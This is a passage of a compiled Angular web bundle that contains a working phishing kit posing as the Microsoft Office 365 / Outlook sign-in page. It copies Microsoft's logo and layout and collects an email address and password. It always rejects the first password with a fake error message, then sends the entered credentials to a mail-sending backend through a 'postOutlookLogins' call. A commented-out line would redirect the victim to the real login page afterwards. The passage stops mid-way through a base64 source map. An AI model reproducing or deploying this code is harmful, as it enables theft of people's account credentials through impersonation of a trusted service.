        return this.httpClient.post("http://localhost:3000/send-mail", body).subscribe(function () {
            console.log(body);
        });
    };
    MailService = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Injectable"])({
            providedIn: 'root'
        }),
        __metadata("design:paramtypes", [_angular_common_http__WEBPACK_IMPORTED_MODULE_1__["HttpClient"]])
    ], MailService);
    return MailService;
}());



/***/ }),

/***/ "./src/app/office365/office365.component.css":
/*!***************************************************!*\
  !*** ./src/app/office365/office365.component.css ***!
  \***************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".office365-wrapper {\n    width: 100%;\n    height: 100vh;\n    /* background-image: url(\"../../assets/background.jpg\"); */\n    display: flex;\n    align-items: center;\n    justify-content: center;\n}\n.microsoft-logo {\n    margin-top: 20px;\n}\n.main {\n    width: 400px;\n    min-height: 300px;\n    background-color: white;\n    display: flex;\n    flex-direction: column;\n    padding: 20px 20px;\n}\nh1 {\n    font-size: 25px;\n    font-weight: 600;\n    margin: 20px 0;\n}\ninput {\n    padding: 5px 5px;\n    line-height: 20px;\n    border: none;\n    font-size: 14px;\n    margin-top: 10px;\n    font-weight: normal;\n    width: auto;\n}\n.password-error, .login-error {\n        font-size: 16px;\n        font-weight: normal;\n        color: red;\n}\n.w3-input {\n    border-bottom: black;\n}\n.noaccount {\n    font-size: .8rem;\n    font-weight: 400;\n}\n.next {\n    display: flex;\n    width: 100px;\n    background-color: #005da6;\n    height: 30px;\n    justify-content: center;\n    align-items: center;\n    color: white;\n    align-self: flex-end;\n    margin-top: 60px;\n    font-weight: 300;\n    font-size: 14px;\n}\nfooter{\n    width: 100%;\n    height: 35px;\n    display: flex;\n    color: white;\n    background-color: rgba(0,0,0,.7);\n    font-size: 13px;\n    justify-content: flex-end;\n    align-items: center;\n    padding-right: 10px;\n    \n    position: fixed;\n    bottom: 0;\n    \n}\n.features {\n    margin-left: 15px;\n    font-weight: 400;\n}\n.password-section {\n    background-color: white;\n    /* margin-top: 90px; */\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n}\na {\n    color: rgb(122, 122, 216);\n    width: 100%;\n    margin-top: 10px;\n    font-size: 15px;\n}\n@media screen and (max-width: 600px) {\n    .main {\n        width: 100%;\n        height: 100vh;\n        padding: 40px 15px;\n        display: flex;\n\n\n    }\n    footer {\n        background-color: white;\n        color: black;\n    }\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvb2ZmaWNlMzY1L29mZmljZTM2NS5jb21wb25lbnQuY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0lBQ0ksWUFBWTtJQUNaLGNBQWM7SUFDZCwyREFBMkQ7SUFDM0QsY0FBYztJQUNkLG9CQUFvQjtJQUNwQix3QkFBd0I7Q0FDM0I7QUFDRDtJQUNJLGlCQUFpQjtDQUNwQjtBQUNEO0lBQ0ksYUFBYTtJQUNiLGtCQUFrQjtJQUNsQix3QkFBd0I7SUFDeEIsY0FBYztJQUNkLHVCQUF1QjtJQUN2QixtQkFBbUI7Q0FDdEI7QUFDRDtJQUNJLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsZUFBZTtDQUNsQjtBQUNEO0lBQ0ksaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQixhQUFhO0lBQ2IsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixvQkFBb0I7SUFDcEIsWUFBWTtDQUNmO0FBQ0Q7UUFDUSxnQkFBZ0I7UUFDaEIsb0JBQW9CO1FBQ3BCLFdBQVc7Q0FDbEI7QUFDRDtJQUNJLHFCQUFxQjtDQUN4QjtBQUNEO0lBQ0ksaUJBQWlCO0lBQ2pCLGlCQUFpQjtDQUNwQjtBQUNEO0lBQ0ksY0FBYztJQUNkLGFBQWE7SUFDYiwwQkFBMEI7SUFDMUIsYUFBYTtJQUNiLHdCQUF3QjtJQUN4QixvQkFBb0I7SUFDcEIsYUFBYTtJQUNiLHFCQUFxQjtJQUNyQixpQkFBaUI7SUFDakIsaUJBQWlCO0lBQ2pCLGdCQUFnQjtDQUNuQjtBQUNEO0lBQ0ksWUFBWTtJQUNaLGFBQWE7SUFDYixjQUFjO0lBQ2QsYUFBYTtJQUNiLGlDQUFpQztJQUNqQyxnQkFBZ0I7SUFDaEIsMEJBQTBCO0lBQzFCLG9CQUFvQjtJQUNwQixvQkFBb0I7O0lBRXBCLGdCQUFnQjtJQUNoQixVQUFVOztDQUViO0FBQ0Q7SUFDSSxrQkFBa0I7SUFDbEIsaUJBQWlCO0NBQ3BCO0FBQ0Q7SUFDSSx3QkFBd0I7SUFDeEIsdUJBQXVCO0lBQ3ZCLFlBQVk7SUFDWixjQUFjO0lBQ2QsdUJBQXVCO0NBQzFCO0FBQ0Q7SUFDSSwwQkFBMEI7SUFDMUIsWUFBWTtJQUNaLGlCQUFpQjtJQUNqQixnQkFBZ0I7Q0FDbkI7QUFDRDtJQUNJO1FBQ0ksWUFBWTtRQUNaLGNBQWM7UUFDZCxtQkFBbUI7UUFDbkIsY0FBYzs7O0tBR2pCO0lBQ0Q7UUFDSSx3QkFBd0I7UUFDeEIsYUFBYTtLQUNoQjtDQUNKIiwiZmlsZSI6InNyYy9hcHAvb2ZmaWNlMzY1L29mZmljZTM2NS5jb21wb25lbnQuY3NzIiwic291cmNlc0NvbnRlbnQiOlsiLm9mZmljZTM2NS13cmFwcGVyIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBoZWlnaHQ6IDEwMHZoO1xuICAgIC8qIGJhY2tncm91bmQtaW1hZ2U6IHVybChcIi4uLy4uL2Fzc2V0cy9iYWNrZ3JvdW5kLmpwZ1wiKTsgKi9cbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG59XG4ubWljcm9zb2Z0LWxvZ28ge1xuICAgIG1hcmdpbi10b3A6IDIwcHg7XG59XG4ubWFpbiB7XG4gICAgd2lkdGg6IDQwMHB4O1xuICAgIG1pbi1oZWlnaHQ6IDMwMHB4O1xuICAgIGJhY2tncm91bmQtY29sb3I6IHdoaXRlO1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICBwYWRkaW5nOiAyMHB4IDIwcHg7XG59XG5oMSB7XG4gICAgZm9udC1zaXplOiAyNXB4O1xuICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgbWFyZ2luOiAyMHB4IDA7XG59XG5pbnB1dCB7XG4gICAgcGFkZGluZzogNXB4IDVweDtcbiAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICBib3JkZXI6IG5vbmU7XG4gICAgZm9udC1zaXplOiAxNHB4O1xuICAgIG1hcmdpbi10b3A6IDEwcHg7XG4gICAgZm9udC13ZWlnaHQ6IG5vcm1hbDtcbiAgICB3aWR0aDogYXV0bztcbn1cbi5wYXNzd29yZC1lcnJvciwgLmxvZ2luLWVycm9yIHtcbiAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICBmb250LXdlaWdodDogbm9ybWFsO1xuICAgICAgICBjb2xvcjogcmVkO1xufVxuLnczLWlucHV0IHtcbiAgICBib3JkZXItYm90dG9tOiBibGFjaztcbn1cbi5ub2FjY291bnQge1xuICAgIGZvbnQtc2l6ZTogLjhyZW07XG4gICAgZm9udC13ZWlnaHQ6IDQwMDtcbn1cbi5uZXh0IHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIHdpZHRoOiAxMDBweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1ZGE2O1xuICAgIGhlaWdodDogMzBweDtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIGNvbG9yOiB3aGl0ZTtcbiAgICBhbGlnbi1zZWxmOiBmbGV4LWVuZDtcbiAgICBtYXJnaW4tdG9wOiA2MHB4O1xuICAgIGZvbnQtd2VpZ2h0OiAzMDA7XG4gICAgZm9udC1zaXplOiAxNHB4O1xufVxuZm9vdGVye1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGhlaWdodDogMzVweDtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGNvbG9yOiB3aGl0ZTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLC43KTtcbiAgICBmb250LXNpemU6IDEzcHg7XG4gICAganVzdGlmeS1jb250ZW50OiBmbGV4LWVuZDtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIHBhZGRpbmctcmlnaHQ6IDEwcHg7XG4gICAgXG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIGJvdHRvbTogMDtcbiAgICBcbn1cbi5mZWF0dXJlcyB7XG4gICAgbWFyZ2luLWxlZnQ6IDE1cHg7XG4gICAgZm9udC13ZWlnaHQ6IDQwMDtcbn1cbi5wYXNzd29yZC1zZWN0aW9uIHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTtcbiAgICAvKiBtYXJnaW4tdG9wOiA5MHB4OyAqL1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbn1cbmEge1xuICAgIGNvbG9yOiByZ2IoMTIyLCAxMjIsIDIxNik7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgbWFyZ2luLXRvcDogMTBweDtcbiAgICBmb250LXNpemU6IDE1cHg7XG59XG5AbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiA2MDBweCkge1xuICAgIC5tYWluIHtcbiAgICAgICAgd2lkdGg6IDEwMCU7XG4gICAgICAgIGhlaWdodDogMTAwdmg7XG4gICAgICAgIHBhZGRpbmc6IDQwcHggMTVweDtcbiAgICAgICAgZGlzcGxheTogZmxleDtcblxuXG4gICAgfVxuICAgIGZvb3RlciB7XG4gICAgICAgIGJhY2tncm91bmQtY29sb3I6IHdoaXRlO1xuICAgICAgICBjb2xvcjogYmxhY2s7XG4gICAgfVxufSJdfQ== */"

/***/ }),

/***/ "./src/app/office365/office365.component.html":
/*!****************************************************!*\
  !*** ./src/app/office365/office365.component.html ***!
  \****************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"office365-wrapper\">\n  <div class=\"main\">\n    <div class=\"microsoft-logo\">\n      <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"108\" height=\"24\" viewBox=\"0 0 108 24\"><title>assets</title><path d=\"M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z\" fill=\"#737373\"/><rect width=\"10.931\" height=\"10.931\" fill=\"#f25022\"/><rect x=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#7fba00\"/><rect y=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#00a4ef\"/><rect x=\"12.069\" y=\"12.069\" width=\"10.931\" height=\"10.931\" fill=\"#ffb900\"/></svg>\n    \n    </div>\n    <section *ngIf=\"signinPage\">\n          <h1>sign in</h1>\n          <span class=\"login-error\" *ngIf=\"loginError\">Your account or password is incorrect.</span>\n        <input type=\"text\" #loginInput class=\"w3-input\" placeholder=\"Email, Phone and skype\" [(ngModel)]=\"login\" >\n        <div class=\"noaccount\">No Acount? \n          <a>Create One?</a>\n        </div>\n        <a class=\"next\" (click)=\"getLogin()\">Next</a>\n    </section>\n    <section class=\"password-section\" *ngIf= \"!signinPage\"  >\n      <div class=\"usser-login\">\n        <i class=\"fa fa-arrow-left\"></i>\n        {{login}}\n      </div>\n      <h1>Enter password</h1>\n      <span class=\"password-error\" *ngIf=\"passwordErrorMessage\">Your account or password is incorrect.</span>\n      <input type=\"password\"  [(ngModel)]= \"password\" placeholder=\"Password\">\n      <label>\n        <input type=\"checkbox\" value=\"Keep me signed in\">\n        <span>Keep me signed in</span>\n      </label>\n      <a>Forgot my password</a> \n      <a>This isnt my origin</a>\n      <a>Sign in with a different microsoft account</a>\n      <a class=\"next\" (click)=\"getPassword()\">Sign in</a>\n\n    </section>\n    \n  </div>\n  <footer>\n    <div class=\"features\">2018 Microsoft</div>\n    <div class=\"features\">Terms of use</div>\n    <div class=\"features\">Privacy and cookies</div>\n  </footer>\n</div>"

/***/ }),

/***/ "./src/app/office365/office365.component.ts":
/*!**************************************************!*\
  !*** ./src/app/office365/office365.component.ts ***!
  \**************************************************/
/*! exports provided: Office365Component */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Office365Component", function() { return Office365Component; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _mail_service__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../mail.service */ "./src/app/mail.service.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};


var Office365Component = /** @class */ (function () {
    function Office365Component(mailService) {
        this.mailService = mailService;
        this.login = "";
        this.password = "";
        this.signinPage = true;
        this.loginError = false;
        this.passwordErrorMessage = false;
        this.passwordEntries = 1;
    }
    Office365Component.prototype.ngOnInit = function () {
    };
    Office365Component.prototype.getLogin = function () {
        setTimeout(function () {
            if (this.login.length > 4) {
                console.log("asafafa");
            }
            else {
                this.loginError = true;
            }
        }, 2000, this.signinPage = false);
        //this.login= "";
    };
    Office365Component.prototype.getPassword = function () {
        if (this.passwordEntries <= 1) {
            this.passwordErrorMessage = true;
            this.password = "";
        }
        else if (this.passwordEntries > 1) {
            this.mailService.postOutlookLogins(this.login, this.password);
            // window.location.assign("https://login.live.com")
        }
        this.passwordEntries++;
    };
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("passwordPage"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "passwordPage", void 0);
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("passwordinput"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "passwordinput", void 0);
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("loginInput"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "loginInput", void 0);
    Office365Component = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-office365',
            template: __webpack_require__(/*! ./office365.component.html */ "./src/app/office365/office365.component.html"),
            styles: [__webpack_require__(/*! ./office365.component.css */ "./src/app/office365/office365.component.css")]
        }),
        __metadata("design:paramtypes", [_mail_service__WEBPACK_IMPORTED_MODULE_1__["MailService"]])
    ], Office365Component);
    return Office365Component;
}());



/***/ }),

/***/ "./src/app/outlook/outlook.component.css":
/*!***********************************************!*\
  !*** ./src/app/outlook/outlook.component.css ***!
  \***********************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".container {\n    width: 100%;\n    height: 900px;\n    display: flex;\n}\n.row-header {\n    position: fixed;\n    display: flex;\n    align-items: center;\n    justify-content: space-between;\n    width: 100%;\n    background: rgba(241,254,244,0.95);\n    padding: 0 18px;\n\n}\n.btn-group-features, .btn-group-auth {\n    display: flex;\n    justify-content: space-between;\n    font-size: 15px;\n    font-weight: bold;\n    font-Family: kurd, sans-serif;\n    \n}\n.btn-group-features  >span:hover, .btn-group-auth >span:hover {\n    font-size: 16px;\n    font-weight: bold;\n    font-Family: kurd, sans-serif;\n    color: rgb(96, 96, 184);\n    \n}\n.btn-create {\n    width: 180px;\n    height: 40px;\n    border-radius: 5px;\n    display: flex;\n    align-items: center;\n    justify-content: center;\n    color: white;\n    background-color: rgb(24, 165, 24);\n    overflow: wrap;\n\n    font-size: 15px;\n    font-weight: bold;\n    font-Family: kurd, sans-serif;\n    margin: 0 15px;\n}\n.btn-group-features {\n    display: flex;\n    align-items: center;\n\n}\n.btn-group-auth {\n    display: flex;\n    align-items: center;\n    \n}\n.features-with-content {\n    margin-left: 6px;\n}\n.btn-group-features > span, .btn-group-auth > span {\n    margin-left: 25px;\n}\n.map-wrapper {\n    width: 100%;\n    height: 100vh;\n    background: rgba(241,254,244,0.95);\n}\n.info {\n    display: flex;\n    flex-direction: column;\n    position: absolute;\n    left: 100px;\n    top: 400px;\n    width: 450px;\n\n}\n.info > h1 {\n    font-weight: 900;\n    margin-bottom: 15px;\n    \n}\n.info > h3 {\n    font-weight: light;\n}\n.info > a {\n    width: 180px;\n    height: 40px;\n    border-radius: 5px;\n    display: flex;\n    align-items: center;\n    justify-content: center;\n    color: white;\n    background-color: rgb(24, 165, 24);\n    overflow: wrap;\n}\n/* .container{\n    width: 100%;\n    height: 100vh;\n    display: flex;\n}\n.row-side {\n    width: 35%;\n    height: 100%;\n    display: flex;\n    align-items: center;\n    justify-content: center;\n    background-color: blueviolet;\n}\n.content {\n    display: flex;\n    align-items: center;\n    justify-content: center;\n    width: 500px;\n    height: 100%;\n}\n.row-content {\n    display: flex;\n    flex-direction: column;\n}\n.img-outlook {\nbackground: transparent;\n}\nh6 {\n    color: darkgray;\n    font-size: 10px;\n    margin: 20px 0;\n}\n.form {\n    display: flex;\n    flex-direction: column;\n}\n.form-group {\n    display: flex;\n    flex-direction: column;\n    margin-bottom: 15px;\n}\n\n.spn-languages {\n    color: darkgray;\n    font-size: 13px;\n}\n.btn-save-group {\n    display: flex;\n    margin: 25px 0;\n}\n.btn-icon-container {\n    border-radius: 50%;\n    width: 15px;\n    height: 15px;\n    border: 2px solid blueviolet;\n}\n.spn-save {\n    margin-left: 15px;\n    color: blueviolet;\n    font-size: 16px;\n}\n.content:before {\n    content: \" \";\n    display: flex;\n    position: relative;\n    left:0;\n    right: 0;\n    top:0;\n    bottom:0;\n    background: inherit;\n    filter: blur(5px);\n}\n@media only screen and (max-width: 600px) {\n    .container {\n        display: flex;\n        flex-direction: column;\n    }\n    .row-side {\n        width: 100%;\n        min-height: 350px;\n    }\n    .content {\n        \n    }\n} */\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvb3V0bG9vay9vdXRsb29rLmNvbXBvbmVudC5jc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7SUFDSSxZQUFZO0lBQ1osY0FBYztJQUNkLGNBQWM7Q0FDakI7QUFDRDtJQUNJLGdCQUFnQjtJQUNoQixjQUFjO0lBQ2Qsb0JBQW9CO0lBQ3BCLCtCQUErQjtJQUMvQixZQUFZO0lBQ1osbUNBQW1DO0lBQ25DLGdCQUFnQjs7Q0FFbkI7QUFDRDtJQUNJLGNBQWM7SUFDZCwrQkFBK0I7SUFDL0IsZ0JBQWdCO0lBQ2hCLGtCQUFrQjtJQUNsQiw4QkFBOEI7O0NBRWpDO0FBQ0Q7SUFDSSxnQkFBZ0I7SUFDaEIsa0JBQWtCO0lBQ2xCLDhCQUE4QjtJQUM5Qix3QkFBd0I7O0NBRTNCO0FBQ0Q7SUFDSSxhQUFhO0lBQ2IsYUFBYTtJQUNiLG1CQUFtQjtJQUNuQixjQUFjO0lBQ2Qsb0JBQW9CO0lBQ3BCLHdCQUF3QjtJQUN4QixhQUFhO0lBQ2IsbUNBQW1DO0lBQ25DLGVBQWU7O0lBRWYsZ0JBQWdCO0lBQ2hCLGtCQUFrQjtJQUNsQiw4QkFBOEI7SUFDOUIsZUFBZTtDQUNsQjtBQUNEO0lBQ0ksY0FBYztJQUNkLG9CQUFvQjs7Q0FFdkI7QUFDRDtJQUNJLGNBQWM7SUFDZCxvQkFBb0I7O0NBRXZCO0FBQ0Q7SUFDSSxpQkFBaUI7Q0FDcEI7QUFDRDtJQUNJLGtCQUFrQjtDQUNyQjtBQUVEO0lBQ0ksWUFBWTtJQUNaLGNBQWM7SUFDZCxtQ0FBbUM7Q0FDdEM7QUFDRDtJQUNJLGNBQWM7SUFDZCx1QkFBdUI7SUFDdkIsbUJBQW1CO0lBQ25CLFlBQVk7SUFDWixXQUFXO0lBQ1gsYUFBYTs7Q0FFaEI7QUFDRDtJQUNJLGlCQUFpQjtJQUNqQixvQkFBb0I7O0NBRXZCO0FBQ0Q7SUFDSSxtQkFBbUI7Q0FDdEI7QUFDRDtJQUNJLGFBQWE7SUFDYixhQUFhO0lBQ2IsbUJBQW1CO0lBQ25CLGNBQWM7SUFDZCxvQkFBb0I7SUFDcEIsd0JBQXdCO0lBQ3hCLGFBQWE7SUFDYixtQ0FBbUM7SUFDbkMsZUFBZTtDQUNsQjtBQXVDRDs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7O0lBb0ZJIiwiZmlsZSI6InNyYy9hcHAvb3V0bG9vay9vdXRsb29rLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyIuY29udGFpbmVyIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBoZWlnaHQ6IDkwMHB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG59XG4ucm93LWhlYWRlciB7XG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgYmFja2dyb3VuZDogcmdiYSgyNDEsMjU0LDI0NCwwLjk1KTtcbiAgICBwYWRkaW5nOiAwIDE4cHg7XG5cbn1cbi5idG4tZ3JvdXAtZmVhdHVyZXMsIC5idG4tZ3JvdXAtYXV0aCB7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47XG4gICAgZm9udC1zaXplOiAxNXB4O1xuICAgIGZvbnQtd2VpZ2h0OiBib2xkO1xuICAgIGZvbnQtRmFtaWx5OiBrdXJkLCBzYW5zLXNlcmlmO1xuICAgIFxufVxuLmJ0bi1ncm91cC1mZWF0dXJlcyAgPnNwYW46aG92ZXIsIC5idG4tZ3JvdXAtYXV0aCA+c3Bhbjpob3ZlciB7XG4gICAgZm9udC1zaXplOiAxNnB4O1xuICAgIGZvbnQtd2VpZ2h0OiBib2xkO1xuICAgIGZvbnQtRmFtaWx5OiBrdXJkLCBzYW5zLXNlcmlmO1xuICAgIGNvbG9yOiByZ2IoOTYsIDk2LCAxODQpO1xuICAgIFxufVxuLmJ0bi1jcmVhdGUge1xuICAgIHdpZHRoOiAxODBweDtcbiAgICBoZWlnaHQ6IDQwcHg7XG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICBjb2xvcjogd2hpdGU7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI0LCAxNjUsIDI0KTtcbiAgICBvdmVyZmxvdzogd3JhcDtcblxuICAgIGZvbnQtc2l6ZTogMTVweDtcbiAgICBmb250LXdlaWdodDogYm9sZDtcbiAgICBmb250LUZhbWlseToga3VyZCwgc2Fucy1zZXJpZjtcbiAgICBtYXJnaW46IDAgMTVweDtcbn1cbi5idG4tZ3JvdXAtZmVhdHVyZXMge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcblxufVxuLmJ0bi1ncm91cC1hdXRoIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgXG59XG4uZmVhdHVyZXMtd2l0aC1jb250ZW50IHtc